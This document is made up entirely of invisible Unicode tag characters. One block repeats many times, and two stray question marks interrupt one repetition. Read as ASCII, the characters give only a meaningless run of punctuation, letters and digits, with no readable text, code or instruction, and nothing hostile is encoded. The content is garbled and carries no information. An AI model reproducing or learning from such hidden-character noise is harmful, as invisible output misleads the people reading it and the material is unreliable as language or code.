󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗??󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣??󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊󠁊󠁊󠁊󠁄󠁓󠁓󠁓󠁗󠁗󠁗󠁗󠁗󠀬󠀬󠀦󠀦󠀦󠀡󠀣󠀣󠀣󠀣󠀣󠁐󠁐󠁐󠁐󠁐󠁐󠁜󠁜󠁜󠁜󠁝󠁝󠁝󠁝󠁘󠁠󠁠󠁡󠁡󠁐󠁈󠁈󠀺󠀸󠀸󠀰󠀴󠀶󠀱󠀱󠀱󠀡󠀡󠀢󠀣󠀦󠀧󠀧󠀤󠀤󠀣󠀣󠀨󠀨󠀩󠀪󠀫󠀬󠀮󠀮󠀯󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊